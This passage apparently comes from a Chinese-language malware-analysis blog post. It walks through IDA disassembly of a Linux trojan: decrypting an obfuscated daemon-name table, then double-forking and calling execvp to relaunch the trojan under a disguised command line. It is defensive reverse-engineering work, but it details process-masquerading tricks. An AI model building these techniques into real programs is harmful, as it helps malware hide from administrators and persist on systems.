class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">0804</span>AC30 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:<span class="hljs-number">0804</span>AC30                 public main<br>.text:<span class="hljs-number">0804</span>AC30 main            <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> DATA</span> XREF:<span class="hljs-title"> _start+17o</span><br><br>....<br><br>.text:0804AF4E<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> offset<span class="hljs-title"> daemonname</span> ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;<br><br>...<br><br>.text:0804AFC2<span class="hljs-title"> loc_804AFC2:</span>                            ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> main+3ABj</span><br>.text:0804AFC2<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> ebx</span><br>.text:0804AFC5<span class="hljs-title">                 add</span> <span class="hljs-title">    ebx,</span> 14h<br>.text:0804AFC8<span class="hljs-title">                 mov</span> <span class="hljs-title">    dword</span> ptr [esp+4], 14h<br>.text:0804AFD0<span class="hljs-title">                 call</span> <span class="hljs-title">   encrypt_code</span><br>.text:0804AFD5<span class="hljs-title">                 cmp</span> <span class="hljs-title">    ebx,</span> offset<span class="hljs-title"> unk_80CBD0C</span><br>.text:0804AFDB<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> loc_804AFC2<br></code></pre></td></tr></table></figure><p>这段汇编代码，使用了一个循环，调用encrypt_code 对daemonname进行了解密。<br>后面的代码，用到了daemonname的地方有下面几处，</p><p>第一处</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804B29F                 <span class="hljs-keyword">call</span>    getpid<br><span class="hljs-symbol">.text:</span>0804B2A4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], (offset <span class="hljs-keyword">aDD</span>+<span class="hljs-number">3</span>) <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span>0804B2AC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br><span class="hljs-symbol">.text:</span>0804B2B4                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span>             ；第三形参 pid<br><span class="hljs-symbol">.text:</span>0804B2B7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">0Ch</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804B2BB                 <span class="hljs-keyword">call</span>    snprintf<br><span class="hljs-symbol">.text:</span>0804B2C0                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">17h</span><br><span class="hljs-symbol">.text:</span>0804B2C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B2CF                 <span class="hljs-keyword">call</span>    randomid<br><span class="hljs-symbol">.text:</span>0804B2D4                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804B2D8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">edi</span>             ；第一形参 要跑的木马<br><span class="hljs-symbol">.text:</span>0804B2DB                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ax</span><br><span class="hljs-symbol">.text:</span>0804B2DE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span>0804B2E1                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, daemonname[<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>] <span class="hljs-comment">; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="hljs-symbol">.text:</span>0804B2E8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span>           <span class="hljs-comment">; 第二形参  daemonname</span><br><span class="hljs-symbol">.text:</span>0804B2EC                 <span class="hljs-keyword">call</span>    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>第二处</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0804B932</span>                 lea     edx, [ebp+var_1888]<br>.text:<span class="hljs-number">0804B938</span>                 add     ebx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0804B93B</span>                 mov     [esp], edx<br>.text:<span class="hljs-number">0804B93E</span>                 call    randmd5<br>.text:<span class="hljs-number">0804B943</span>                 mov     [ebp+var_22], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B94A</span>                 mov     [ebp+var_1E], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B951</span>                 mov     [ebp+var_1A], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B957</span>                 call    getpid<br>.text:<span class="hljs-number">0804B95C</span>                 mov     dword ptr [esp+<span class="hljs-number">8</span>], (offset aDD+<span class="hljs-number">3</span>) ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0804B964</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br>.text:<span class="hljs-number">0804B96C</span>                 mov     [esp], esi<br>.text:<span class="hljs-number">0804B96F</span>                 mov     [esp+<span class="hljs-number">0Ch</span>], eax<br>.text:<span class="hljs-number">0804B973</span>                 call    snprintf<br>.text:<span class="hljs-number">0804B978</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], 17h<br>.text:<span class="hljs-number">0804B980</span>                 mov     dword ptr [esp], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B987</span>                 call    randomid<br>.text:<span class="hljs-number">0804B98C</span>                 mov     [esp+<span class="hljs-number">8</span>], esi<br>.text:<span class="hljs-number">0804B990</span>                 movzx   eax, ax<br>.text:<span class="hljs-number">0804B993</span>                 lea     eax, [eax+eax*<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B996</span>                 lea     eax, daemonname[eax*<span class="hljs-number">4</span>] ; <span class="hljs-string">&quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br>.text:<span class="hljs-number">0804B99D</span>                 mov     [esp+<span class="hljs-number">4</span>], eax<br>.text:<span class="hljs-number">0804B9A1</span>                 lea     eax, [ebp+var_1888]<br>.text:<span class="hljs-number">0804B9A7</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B9AA</span>                 call    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>第三处</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804B9DF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">ebp</span>+var_1C88]<br><span class="hljs-symbol">.text:</span>0804B9E5                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0804B9E8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>0804B9EB                 <span class="hljs-keyword">call</span>    randmd5<br><span class="hljs-symbol">.text:</span>0804B9F0                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_22], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B9F7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_1E], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B9FE                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_1A], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804BA04                 <span class="hljs-keyword">call</span>    getpid<br><span class="hljs-symbol">.text:</span>0804BA09                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], (offset <span class="hljs-keyword">aDD</span>+<span class="hljs-number">3</span>) <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span>0804BA11                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br><span class="hljs-symbol">.text:</span>0804BA19                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804BA1C                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">0Ch</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA20                 <span class="hljs-keyword">call</span>    snprintf<br><span class="hljs-symbol">.text:</span>0804BA25                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">17h</span><br><span class="hljs-symbol">.text:</span>0804BA2D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804BA34                 <span class="hljs-keyword">call</span>    randomid<br><span class="hljs-symbol">.text:</span>0804BA39                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804BA3D                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ax</span><br><span class="hljs-symbol">.text:</span>0804BA40                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span>0804BA43                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, daemonname[<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>] <span class="hljs-comment">; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="hljs-symbol">.text:</span>0804BA4A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA4E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+var_1C88]<br><span class="hljs-symbol">.text:</span>0804BA54                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA57                 <span class="hljs-keyword">call</span>    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>都是作为LinuxExec_Argv2 参数使用的，接着来看LinuxExec_Argv2 的代码</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">08048520</span> LinuxExec_Argv2 <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> DelService+B3p</span><br>.text:08048520                                         ;<span class="hljs-title"> DelService+CBlp</span> ...<br>.text:08048520<br>.text:08048520<span class="hljs-title"> argv</span>            =<span class="hljs-title"> dword</span> ptr -18h<br>.text:08048520<span class="hljs-title"> var_14</span>          =<span class="hljs-title"> dword</span> ptr -14h<br>.text:08048520<span class="hljs-title"> var_10</span>          =<span class="hljs-title"> dword</span> ptr -10h<br>.text:08048520<span class="hljs-title"> var_C</span>           =<span class="hljs-title"> dword</span> ptr -0Ch<br>.text:08048520<span class="hljs-title"> var_8</span>           =<span class="hljs-title"> dword</span> ptr -8<br>.text:08048520<span class="hljs-title"> var_4</span>           =<span class="hljs-title"> dword</span> ptr -4<br>.text:08048520<span class="hljs-title"> file</span>            =<span class="hljs-title"> dword</span> ptr  8<br>.text:08048520<span class="hljs-title"> arg_4</span>           =<span class="hljs-title"> dword</span> ptr  0Ch<br>.text:08048520<span class="hljs-title"> arg_8</span>           =<span class="hljs-title"> dword</span> ptr  10h<br>.text:08048520<br>.text:08048520<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:08048521<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:08048523<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 28h<br>.text:08048526<span class="hljs-title">                 mov</span>     [ebp+var_4],<span class="hljs-title"> esi</span><br>.text:08048529<span class="hljs-title">                 mov</span> <span class="hljs-title">    esi,</span> [ebp+file]<br>.text:0804852C<span class="hljs-title">                 mov</span>     [ebp+var_8],<span class="hljs-title"> ebx</span><br>.text:0804852F<span class="hljs-title">                 mov</span>     [ebp+argv], 0<br>.text:08048536<span class="hljs-title">                 mov</span>     [ebp+var_14], 0<br>.text:0804853D<span class="hljs-title">                 mov</span>     [ebp+var_10], 0<br>.text:08048544<span class="hljs-title">                 mov</span>     [ebp+var_C], 0<br>.text:0804854B<span class="hljs-title">                 call</span> <span class="hljs-title">   doublefork</span><br>.text:08048550<span class="hljs-title">                 test</span> <span class="hljs-title">   eax,</span> eax<br>.text:08048552<span class="hljs-title">                 jz</span> <span class="hljs-title">     short</span> ZERO<br>.text:08048554<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> [ebp+var_8]<br>.text:08048557<span class="hljs-title">                 mov</span> <span class="hljs-title">    esi,</span> [ebp+var_4]<br>.text:0804855A<span class="hljs-title">                 mov</span> <span class="hljs-title">    esp,</span> ebp<br>.text:0804855C<span class="hljs-title">                 pop</span> <span class="hljs-title">    ebp</span><br>.text:0804855D<span class="hljs-title">                 retn</span><br>.text:0804855E ; ---------------------------------------------------------------------------<br>.text:0804855E<br>.text:0804855E<span class="hljs-title"> ZERO:</span>                                   ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> LinuxExec_Argv2+32j</span><br>.text:0804855E<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> 3<br>.text:08048563<br>.text:08048563<span class="hljs-title"> LOOP:</span>                                   ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> LinuxExec_Argv2+54j</span><br>.text:08048563<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> ebx</span>      ;<span class="hljs-title"> fd</span><br>.text:08048566<span class="hljs-title">                 add</span> <span class="hljs-title">    ebx,</span> 1<br>.text:08048569<span class="hljs-title">                 call</span> <span class="hljs-title">   close</span><br>.text:0804856E<span class="hljs-title">                 cmp</span> <span class="hljs-title">    ebx,</span> 400h       ；400h == 1024<br>.text:08048574<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> LOOP<br>.text:08048576<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_4]<br>.text:08048579<span class="hljs-title">                 mov</span>     [ebp+argv],<span class="hljs-title"> esi</span><br>.text:0804857C<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> esi</span>      ;<span class="hljs-title"> file</span><br>.text:0804857F<span class="hljs-title">                 mov</span>     [ebp+var_14],<span class="hljs-title"> eax</span><br>.text:08048582<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_8]；eax =<span class="hljs-title"> pid</span><br>.text:08048585<span class="hljs-title">                 mov</span>     [ebp+var_10],<span class="hljs-title"> eax</span><br>.text:08048588<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [ebp+argv]<br>.text:0804858B<span class="hljs-title">                 mov</span>     [esp+4],<span class="hljs-title"> eax</span>    ;<span class="hljs-title"> argv</span><br>.text:0804858F<span class="hljs-title">                 call</span> <span class="hljs-title">   execvp</span><br>.text:08048594<span class="hljs-title">                 mov</span> <span class="hljs-title">    dword</span> ptr [esp], 0 ;<span class="hljs-title"> status</span><br>.text:0804859B<span class="hljs-title">                 call</span> <span class="hljs-title">   exit</span><br>.text:0804859B<span class="hljs-title"> LinuxExec_Argv2</span> endp<br></code></pre></td></tr></table></figure><p>LinuxExec_Argv2 有三个参数。最终执行了execvp</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804857C                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span>      <span class="hljs-comment">; file </span><br>...<br><span class="hljs-symbol">.text:</span>0804858B                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span>    <span class="hljs-comment">; argv</span><br><span class="hljs-symbol">.text:</span>0804858F                 <span class="hljs-keyword">call</span>    execvp<br></code></pre></td></tr></table></figure><p>伪代码为，</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">execvp(<span class="hljs-name">file</span>, <span class="hljs-symbol">&amp;argv</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>file 就是arg_0, 需要分析argv， 调出栈图就比较清晰了。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            dd ?                    ; offset</span><br><span class="hljs-deletion">-00000014 var_14          dd ?</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br><br></code></pre></td></tr></table></figure><p>首先是这句</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048529</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, [<span class="hljs-built_in">ebp</span>+file]<br>...<br><span class="hljs-symbol">.text:</span>0804852F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span class="hljs-number">0</span><br>...<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048579</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span class="hljs-built_in">esi</span><br><br></code></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                       ; offset</span><br><span class="hljs-deletion">-00000014 var_14          dd ?</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br></code></pre></td></tr></table></figure><p>再看这几句代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048576</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+arg_4]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048579</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span class="hljs-built_in">esi</span><br>...<br><span class="hljs-symbol">.text:</span>0804857F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_14], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                   ; offset</span><br><span class="hljs-deletion">-00000014 var_14          arg_4</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br></code></pre></td></tr></table></figure><p>接下来是这几句代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048582</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+arg_8]；<span class="hljs-built_in">eax</span> = pid<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048585</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_10], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                   ; offset</span><br><span class="hljs-deletion">-00000014 var_14          arg_4</span><br><span class="hljs-deletion">-00000010 var_10          arg_8</span><br><span class="hljs-deletion">-0000000C var_C           0</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br>`<br></code></pre></td></tr></table></figure><p>main函数中对LinuxExec_Argv2 的调用的为代码为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">LinuxExec_Argv2(&#x27;木马路径&#x27;, &#x27;伪装命令行&#x27;, pid);<br></code></pre></td></tr></table></figure><p>因此最后调用的execvp的伪代码为</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">execvp</span>(&#x27;木马路径&#x27;, argv);<br></code></pre></td></tr></table></figure><p>将进入 main 函数参数个数为3的流程，用IDA重命名后，关键代码为</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs maxima">text:<span class="hljs-number">0804B5D3</span> PARAM_NUM_3:                            ; CODE XREF: main+3CDj<br><br>.text:<span class="hljs-number">0804B5D3</span>                 lea     eax, 